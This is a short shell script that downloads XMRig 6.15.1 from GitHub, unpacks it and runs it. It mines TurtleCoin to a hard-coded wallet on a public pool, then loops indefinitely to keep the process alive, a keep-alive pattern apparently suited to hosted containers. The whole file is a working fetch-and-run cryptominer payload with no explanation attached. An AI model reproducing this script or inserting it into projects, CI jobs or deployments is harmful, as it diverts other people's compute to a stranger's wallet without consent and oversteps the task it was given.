#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -o de.turtlecoin.herominers.com:1160 -u TRTLv39d6pRET9x9Vm3qfoh7zVh5bsgroHZkt3Q48yPh1SpDZDnEkzt2SHu5kPUnoZLvdR5XjUMfaRaDdgYQ5qW2bRB3upTPd8w -p zero -k -a argon2/chukwav2
while [ 1 ]; do
sleep 3
done
sleep 999
